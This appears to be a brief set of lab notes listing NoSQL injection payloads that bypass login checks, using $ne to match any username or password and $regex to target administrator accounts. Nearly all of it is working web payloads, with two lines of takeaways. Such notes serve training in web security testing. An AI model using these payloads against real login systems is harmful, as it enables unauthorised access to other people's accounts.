# Authentication Bypass Payloads

## Match Any Username

```json
{
  "username":{"$ne":"invalid"},
  "password":"peter"
}
```

---

## Match Any Password

```json
{
  "username":"wiener",
  "password":{"$ne":"invalid"}
}
```

---

## Match Both

```json
{
  "username":{"$ne":"invalid"},
  "password":{"$ne":"invalid"}
}
```

---

## Target Administrator

```json
{
  "username":{"$regex":"admin.*"},
  "password":{"$ne":""}
}
```

---

# Purpose

These payloads manipulate authentication queries to bypass login checks.

---

# Key Takeaways

- `$ne` bypasses equality checks.
- `$regex` targets specific accounts.